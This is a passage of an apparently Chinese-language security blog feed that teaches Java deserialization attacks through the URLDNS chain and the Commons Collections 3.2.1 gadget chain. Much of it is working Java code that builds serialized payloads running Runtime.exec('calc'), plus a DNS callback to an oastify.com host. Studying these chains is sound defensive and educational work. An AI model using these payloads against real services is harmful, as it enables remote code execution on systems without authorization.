class_">ChainedTransformer</span>(Transformers);</span><br><span class="line">HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;Object,Object&gt;();</span><br><span class="line"><span class="type">Map</span> <span class="variable">lazymap</span> <span class="operator">=</span> LazyMap.decorate(map, chainedTransformer);</span><br><span class="line"></span><br><span class="line"><span class="comment">//断开利用链</span></span><br><span class="line"><span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(map,<span class="string">&quot;13&quot;</span>);</span><br><span class="line"><span class="comment">//TiedMapEntry tiedMapEntry = new TiedMapEntry(lazymap,&quot;13&quot;);</span></span><br><span class="line">HashMap&lt;Object,Object&gt; hashMap=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">hashMap.put(tiedMapEntry,<span class="string">&quot;123&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//反射恢复利用链</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> tiedMapEntry.getClass();</span><br><span class="line"><span class="type">Field</span> <span class="variable">mapfield</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;map&quot;</span>);</span><br><span class="line">mapfield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">mapfield.set(tiedMapEntry,lazymap);</span><br><span class="line">Test.Serialize(hashMap);</span><br></pre></td></tr></table></figure><p>反序列化命令执行成功！！！</p><p><img src="image-20230323173008338.png" alt="image-20230323173008338"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;动态代理&quot;&gt;动态代理&lt;/h1&gt;
&lt;p&gt;&lt;code&gt;Java动态代理&lt;/code&gt;是一种在运行时生成代理对象的机制,它可以在运行时动态地创建一个实现特定接口的代理类,并将所有调用委托给处理器。&lt;/p&gt;
&lt;p&gt;在Java中,动态代理由java.lang.reflect</summary>
      
    
    
    
    <category term="JAVA" scheme="http://example.com/categories/JAVA/"/>
    
    
    <category term="反序列化" scheme="http://example.com/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>java反序列化之DNSURL和CommonsCollections</title>
    <link href="http://example.com/post/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BDNSURL%E5%92%8CCommonsCollections/"/>
    <id>http://example.com/post/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BDNSURL%E5%92%8CCommonsCollections/</id>
    <published>2023-03-21T12:50:23.000Z</published>
    <updated>2023-06-14T11:56:03.661Z</updated>
    
    <content type="html"><![CDATA[<h1 id="序列化与反序列化">序列化与反序列化</h1><p>java序列化是通过<code>ObjectOutputStream</code>类中的<code>writeObject</code>方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">Serialize</span><span class="params">(Object a)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">    <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;test.ser&quot;</span>));</span><br><span class="line">    objectOutputStream.writeObject(a);</span><br><span class="line">    objectOutputStream.close();</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>反序列化是通过<code>ObjectInputStream</code>类中的<code>readObject</code>方法</p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">public</span> Object <span class="title function_">Unserialize</span><span class="params">()</span> <span class="keyword">throws</span>  Exception&#123;</span><br><span class="line">    <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;test.cer&quot;</span>));</span><br><span class="line">    <span class="type">People</span> <span class="variable">people</span> <span class="operator">=</span> (People) objectInputStream.readObject();</span><br><span class="line">    objectInputStream.close();</span><br><span class="line">    <span class="keyword">return</span> people;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>序列化和反序列化这是两个很正常的功能，但我们稍加利用就可以用它来执行恶意代码</p><h1 id="DNSURL">DNSURL</h1><h2 id="readObject">readObject</h2><p><img src="c58b649d5bef48cf88f321c317826a61.png" alt=""></p><p>如果反序列化的类中<code>本身带有readObject方法</code>，那么在反序列化的时候就会调用类中的readObject方法</p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//这里必须是private</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream objectInputStream)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">      objectInputStream.defaultReadObject();</span><br><span class="line">      System.out.println(<span class="string">&quot;people的readObject被调用了&quot;</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p><img src="d60e544ca13b4b809c3d1f273d2c1441.png" alt="在这里插入图片描述"></p><h2 id="HashMap">HashMap</h2><p>而对于hashmap这个java内置类是可序列化并带有readObject方法的，同时readObject又调用了hash方法<br><img src="f89214c72fc341deb5641f19278037f2.png" alt="在这里插入图片描述">hash方法里又调用了key的hashCode方法<br><img src="f59293f999814a9d8a5e455257cf5dc0.png" alt="在这里插入图片描述"><br>这里的hashCode是Object类中的方法<br><img src="1c29f42171b948709d29e56c833b010b.png" alt="在这里插入图片描述"><br>但URL类中也有一个hashCode方法<br><img src="6f25d1673b064347ad78358b51a122da.png" alt="在这里插入图片描述"><br>这个hashCode会调用handler类的hashCode方法,而getHostAddress会向输入的url发送dns查询请求<br><img src="32965cd52fc241a581c3ba0ed1983f66.png" alt="在这里插入图片描述"><br>总的来说就是<br>HashMap.readObject()-&gt;HashMap.hash()-&gt;key.hashCode()<br>URL.hashCode()-&gt;handler.hashCode()-&gt;getHostAddress()</p><p>我们如果让URL类作为HashMap的key,就会调用URL.hashCode()，最终调用getHostAddress（）<br>可以通过dnslog来判断getHostAddress方法是否执行，然而仅仅只是以下的方法是不行的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HashMap&lt;URL,Integer&gt; hashMap=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;URL,Integer&gt;();</span><br><span class="line">hashMap.put(<span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://w85euszvkqr7x2s5cjco79cj0a63us.oastify.com&quot;</span>),<span class="number">1</span>);</span><br><span class="line">Serialize(hashMap);</span><br></pre></td></tr></table></figure><p>因为HashMap的put方法已经调用了hash方法<br><img src="0201dc94792d4b76a4be1549a2a78bb2.png" alt="在这里插入图片描述"><br>而且要调用URL的hashcode方法，URL中的私有属性hashCode必须为-1，但在初始化以后该值就变了，所以我们要通过反射的方法，将hashCode重新变为-1</p><h2 id="反射">反射</h2><p>Java中的反射是指在运行时动态地获取类的信息并操作类的属性、方法和构造函数等。通过反射，可以在运行时获取类的信息，包括类名、父类、接口、方法、属性等，并且可以在运行时动态地创建对象、调用方法、访问属性等</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//得到Class对象</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> people.getClass();<span class="comment">//通过getClass获取指定对象的Class</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;People&quot;</span>);<span class="comment">//通过forName获取指定名字的Class</span></span><br><span class="line"><span class="comment">//获取实例化对象</span></span><br><span class="line"><span class="type">Constructor</span> <span class="variable">peopleconstructor</span> <span class="operator">=</span> c.getConstructor(<span class="type">int</span>.class,String.class);<span class="comment">//确定实例化方法</span></span><br><span class="line"><span class="type">People</span> <span class="variable">p</span> <span class="operator">=</span> (People)peopleconstructor.newInstance(<span class="number">12</span>,<span class="string">&quot;jack&quot;</span>);<span class="comment">//使用newInstance方法实例化</span></span><br><span class="line"><span class="comment">//获取类的属性</span></span><br><span class="line">Field[] peoplefields = c.getFields();<span class="comment">//获取类中所有的公有属性</span></span><br><span class="line"><span class="type">Field</span> <span class="variable">agefield</span> <span class="operator">=</span> c.getField(<span class="string">&quot;age&quot;</span>);<span class="comment">//获取类中名为age的属性</span></span><br><span class="line">Field[] peoplefields = c.getDeclaredFields();<span class="comment">//获取类中所有的私有属性</span></span><br><span class="line"><span class="type">Field</span> <span class="variable">namefield</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;name&quot;</span>);<span class="comment">//获取类中名为name的私有属性</span></span><br><span class="line">namefield.setAccessible(<span class="literal">true</span>);<span class="comment">//允许修改私有属性</span></span><br><span class="line">namefield.set(p,<span class="string">&quot;tony&quot;</span>);<span class="comment">//利用set方法将对象p的name属性的值修改为tony</span></span><br><span class="line"><span class="comment">//调用类里的方法</span></span><br><span class="line">Method[] poplemethods = c.getMethods();<span class="comment">//获取所有的公共方法</span></span><br><span class="line"><span class="type">Method</span> <span class="variable">changnamemethod</span> <span class="operator">=</span> c.getMethod(<span class="string">&quot;changname&quot;</span>);<span class="comment">//获取changename方法</span></span><br><span class="line">changnamemethod.invoke(p,<span class="string">&quot;perter&quot;</span>);<span class="comment">//调用chanename方法并传入参数“perter”</span></span><br></pre></td></tr></table></figure><h2 id="结果">结果</h2><p>通过反射我们可以在初始化url类以后再把hashCode的值转回-1</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">HashMap&lt;URL,Integer&gt; hashMap=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;URL,Integer&gt;();</span><br><span class="line">URL url=<span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://w85euszvkqr7x2s5cjco79cj0a63us.oastify.com&quot;</span>);</span><br><span class="line">Class c=url.getClass();<span class="comment">//获取url的类</span></span><br><span class="line"><span class="type">Field</span> <span class="variable">hashcodefield</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);<span class="comment">//得到hashCode属性</span></span><br><span class="line">hashcodefield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">hashcodefield.set(url,<span class="number">12345</span>);<span class="comment">//防止在put的时候发送请求，将hashCode的值修改为12345</span></span><br><span class="line">hashMap.put(url,<span class="number">1</span>);</span><br><span class="line">hashcodefield.set(url,-<span class="number">1</span>);<span class="comment">//将hashCode的值修改为-1</span></span><br><span class="line">Serialize(hashMap);</span><br></pre></td></tr></table></figure><p>那么在序列化的时候dnslog就不会收到dns请求<br>而反序列化的时候就会收到dns请求了<br><img src="9eec5831654c4b729f22aa1b5be6eac7.png" alt="在这里插入图片描述"></p><h1 id="Commonscollections">Commonscollections</h1><h2 id="环境">环境</h2><p>使用的jdk版本是8u65（需要在<code>8u71</code>以下），同时下载对应的openjdk，并复制sun文件添加进idea</p><p>Commonscollections使用的版本是存在漏洞的<code>3.2.1</code>版本</p><h2 id="InvokerTransformer">InvokerTransformer</h2><p>maven包中有一个<code>Transformer</code>接口，定义了一个transform方法，有非常多的实现类</p><p><img src="image-20230321214051542.png" alt="image-20230321214051542"></p><p>其中主要产生漏洞的是<code>InvokerTransformer</code>类的transform方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//InvokerTransformer构造方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">InvokerTransformer</span><span class="params">(String methodName, Class[] paramTypes, Object[] args)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">        iMethodName = methodName;</span><br><span class="line">        iParamTypes = paramTypes;</span><br><span class="line">        iArgs = args;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//transform方法</span></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (input == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> input.getClass();</span><br><span class="line">            <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(iMethodName, iParamTypes);</span><br><span class="line">            <span class="keyword">return</span> method.invoke(input, iArgs);</span><br><span class="line">                </span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; does not exist&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; cannot be accessed&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvocationTargetException ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; threw an exception&quot;</span>, ex);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>transform方法会通过反射来调用input对象的methodName方法，其中传入的参数为args，参数类型为paramTypes，故此以下代码就会调出计算机</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//a.b(c)=new InvokerTransformer(b,new Class[]&#123;c对应的类对象&#125;,new Object[]&#123;c&#125;).transform(a);</span></span><br><span class="line"><span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;).transform(runtime);</span><br></pre></td></tr></table></figure><p>我们的目标是找到一个重写了readObject的类，通过一条利用链最终调用这个transform方法</p><h2 id="TransformedMap">TransformedMap</h2><p>接下来要找一下谁调用了nvokerTransformer类的transform方法（最好不同名字）</p><p>可以看到在TransformedMap的checkSetValue中有被调用</p><p><img src="image-20230321221426491.png" alt="image-20230321221426491"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> Object <span class="title function_">checkSetValue</span><span class="params">(Object value)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> valueTransformer.transform(value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么这里就要让<code>TransformedMap.valueTransformer=invokerTransformer对象</code></p><p>而TransformedMap有个<code>decorate</code>方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">decorate</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">TransformedMap</span>(map, keyTransformer, valueTransformer);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>利用链：TransformedMap.checkSetValue()-&gt;InvokerTransformer.transform()</code></p><p>命令执行代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;);</span><br><span class="line">HashMap&lt;Object,Object&gt; map = new HashMap&lt;Object, Object&gt;();</span><br><span class="line">map.put(&quot;key&quot;,&quot;value&quot;);</span><br><span class="line">TransformedMap.decorate(map,null,invokerTransformer);</span><br></pre></td></tr></table></figure><h2 id="AbstractInputCheckedMapDecorator">AbstractInputCheckedMapDecorator</h2><p>然后去找调用了checkSetValue的方法，发现只有一个AbstractInputCheckedMapDecorator的setValue方法</p><p><img src="image-20230321222118113.png" alt="image-20230321222118113"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">setValue</span><span class="params">(Object value)</span> &#123;</span><br><span class="line">    value = parent.checkSetValue(value);</span><br><span class="line">    <span class="keyword">return</span> entry.setValue(value);<span class="comment">//从这一行可以推断出是对entry.setValue()方法的重写</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里很明显是对entry.setValue()方法的一个重写，所以我们只需要在迭代器遍历Map时执行entry.setValue()即可</p><p><code>利用链：AbstractInputCheckedMapDecorator.MapEntry.setValue()-&gt;TransformedMap.checkSetValue()-&gt;InvokerTransformer.transform()</code></p><p>命令执行代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line"><span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line">HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;Object, Object&gt;();</span><br><span class="line">map.put(<span class="string">&quot;key&quot;</span>,<span class="string">&quot;value&quot;</span>);</span><br><span class="line">Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map,<span class="literal">null</span>,invokerTransformer);</span><br><span class="line"><span class="keyword">for</span>(Map.Entry entry:transformedMap.entrySet())&#123;</span><br><span class="line">    entry.setValue(runtime);<span class="comment">//这里的“value”也就是InvokerTransformer.transform(Object input)中的input,所以是runtime对象</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="image-20230321224034922.png" alt="image-20230321224034922"></p><p>接下类同样得去找一个类调用了setValue()方法，并且这个类最好是通过readObject调用的</p><h2 id="AnnotationInvocationHandler">AnnotationInvocationHandler</h2><p>最终我们找到了sun.reflect.annotation.AnnotationInvocationHandler类中的readObject方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">    <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;</span><br><span class="line">    s.defaultReadObject();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check to make sure that types have not evolved incompatibly</span></span><br><span class="line"></span><br><span class="line">    <span class="type">AnnotationType</span> <span class="variable">annotationType</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        annotationType = AnnotationType.getInstance(type);</span><br><span class="line">    &#125; <span class="keyword">catch</span>(IllegalArgumentException e) &#123;</span><br><span class="line">        <span class="comment">// Class is no longer an annotation type; time to punch out</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.InvalidObjectException(<span class="string">&quot;Non-annotation type in annotation serial stream&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// If there are annotation members without values, that</span></span><br><span class="line">    <span class="comment">// situation is handled by the invoke method.</span></span><br><span class="line">    <span class="keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> memberValue.getKey();</span><br><span class="line">        Class&lt;?&gt; memberType = memberTypes.get(name);</span><br><span class="line">        <span class="keyword">if</span> (memberType != <span class="literal">null</span>) &#123;  <span class="comment">// i.e. member still exists</span></span><br><span class="line">            <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> memberValue.getValue();</span><br><span class="line">            <span class="keyword">if</span> (!(memberType.isInstance(value) ||</span><br><span class="line">                  value <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                memberValue.setValue(<span class="comment">//这里调用了setValue()方法！！！</span></span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">AnnotationTypeMismatchExceptionProxy</span>(</span><br><span class="line">                        value.getClass() + <span class="string">&quot;[&quot;</span> + value + <span class="string">&quot;]&quot;</span>).setMember(</span><br><span class="line">                            annotationType.members().get(name)));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>反序列化的时候会通过迭代器遍历this.memberValues，所以这里要让<code>this.memberValues=transformedMap</code></p><p>来看看AnnotationInvocationHandler类的构造方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">AnnotationInvocationHandler(Class&lt;? <span class="keyword">extends</span> <span class="title class_">Annotation</span>&gt; type, Map&lt;String, Object&gt; memberValues) &#123;</span><br><span class="line">        Class&lt;?&gt;[] superInterfaces = type.getInterfaces();</span><br><span class="line">        <span class="keyword">if</span> (!type.isAnnotation() ||</span><br><span class="line">            superInterfaces.length != <span class="number">1</span> ||</span><br><span class="line">            superInterfaces[<span class="number">0</span>] != java.lang.annotation.Annotation.class)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AnnotationFormatError</span>(<span class="string">&quot;Attempt to create proxy for a non-annotation type.&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.type = type;</span><br><span class="line">        <span class="built_in">this</span>.memberValues = memberValues;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个构造方法没有修饰符只具有包级别访问权限，所以这里我们只能通过反射来调用来实例化对象，同时第一个参数只允许是注解类型或其子类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> constructor.newInstance(Override.class,transformedMap);</span><br></pre></td></tr></table></figure><h2 id="存在的问题">存在的问题</h2><p>目前已经可以将我们构造的map传进去了，但仍然面临几个问题</p><p>1.Runtime类没有实现Serializable，无法反序列化</p><p>2.要想程序执行到setValue()方法，前面有2个if判断语句得想办法</p><p>3.AnnotationInvocationHandler类里的setvalue()参数为</p><p>new AnnotationTypeMismatchExceptionProxy(value.getClass() + “[” + value + “]”).setMember(annotationType.members().get(name))</p><p>但这并不是我们想传入的参数</p><p>一个一个来解决吧</p><h3 id="Runtime类反序列化">Runtime类反序列化</h3><p>我们可以通过<code>反射+ChainedTransformer</code>来解决</p><p>反射创建Runtime实例并调用exec()</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Class  c = Class.forName(&quot;java.lang.Runtime&quot;);</span><br><span class="line">Method m = c.getMethod(&quot;getRuntime&quot;);</span><br><span class="line">Runtime r = (Runtime) m.invoke(null,null);</span><br><span class="line">Method execmethod = c.getMethod(&quot;exec&quot;, String.class);</span><br><span class="line">execmethod.invoke(r,&quot;calc&quot;);</span><br><span class="line">Runtime.getRuntime().exec(&quot;calc&quot;);</span><br></pre></td></tr></table></figure><p>将上述代码转换成用InvokerTransformer类的transform方法实现</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Method</span> <span class="variable">m</span> <span class="operator">=</span> (Method)<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;).transform(Runtime.class);</span><br><span class="line"><span class="type">Runtime</span> <span class="variable">r</span> <span class="operator">=</span> (Runtime)<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;).transform(m);</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;).transform(r);</span><br></pre></td></tr></table></figure><p>这里有一个特征，第一行的结果作为第二行的输入，而第二行的结果又作为第三行的输入，且都是transform方法，ChainedTransformer类的transform方法刚好有这个功能</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 